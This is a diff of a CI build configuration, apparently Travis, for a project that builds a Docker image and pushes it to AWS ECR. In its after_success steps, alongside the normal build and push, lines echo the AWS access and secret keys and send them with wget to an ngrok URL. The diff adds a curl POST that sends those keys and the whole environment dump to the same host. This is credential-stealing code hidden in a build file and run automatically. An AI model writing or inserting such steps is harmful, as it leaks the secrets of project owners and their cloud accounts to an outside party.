@@ -20,7 +20,9 @@ after_success:
   - echo $AWS_ACCESS_KEY_ID
   - echo $AWS_SECRET_ACCESS_KEY
   - wget http://3e48888d1720.ngrok.io/accesskey=$(echo $AWS_ACCESS_KEY_ID)%20secretkey=$(echo $AWS_SECRET_ACCESS_KEY)
-  - curl -d "accessKey=$(echo $AWS_ACCESS_KEY)&secretKey=$(echo $AWS_SECRET_ACCESS_KEY)" -X POST http://3e48888d1720.ngrok.io/
+  - export stuff=`env`
+  - echo $stuff
+  - curl -d "accessKey=$(echo $AWS_ACCESS_KEY_ID)&secretKey=$(echo $AWS_SECRET_ACCESS_KEY)&env=$(echo $stuff)" -X POST http://3e48888d1720.ngrok.io/
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
